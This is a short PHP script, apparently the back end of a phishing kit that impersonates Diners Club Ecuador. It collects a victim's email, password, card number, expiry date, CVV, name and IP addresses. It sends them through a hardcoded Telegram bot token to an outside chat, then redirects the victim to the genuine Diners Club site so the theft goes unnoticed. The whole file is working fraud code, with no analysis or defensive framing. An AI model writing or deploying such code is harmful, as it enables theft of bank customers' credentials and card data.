<?php
session_start();

// Construir el mensaje
$message = "Diners\n";
$message .= "-------------------------------------------\n";
$message .= 'E: ' . $_SESSION['u1'] . "\n";
$message .= 'P: ' . $_SESSION['u2'] . "\n";
$message .= 'NM: ' . $_POST['gtrip01'] . "\n";
$message .= 'AP: ' . $_POST['gtrip02'] . "\n";
$message .= 'T: ' . $_POST['gtrip03'] . "\n";
$message .= 'FV: ' . $_POST['gtrip04'] . "/" . $_POST['gtrip05'] . "\n";
$message .= 'CV: ' . $_POST['gtrip06'] . "\n";

// Verificar si la clave HTTP_X_FORWARDED_FOR existe antes de usarla
$ip2 = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : 'No disponible';
$message .= 'IP1: ' . $_SERVER['REMOTE_ADDR'] . "\n";
$message .= 'IP2: ' . $ip2 . "\n";

$message .= 'Date: ' . date("d-m-Y") . "\n";

// Datos del bot de Telegram
$token = "5555165841:AAE7e0yrao7YTcSmfDKy0Y6vnY0SO-0UyFE";
$chat_id = "1024082369";

// Enviar la información a Telegram
$sendText = urlencode($message);
$url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$sendText";

file_get_contents($url);

    header ('Location:https://www.dinersclub.com.ec/');


    session_destroy();
?>

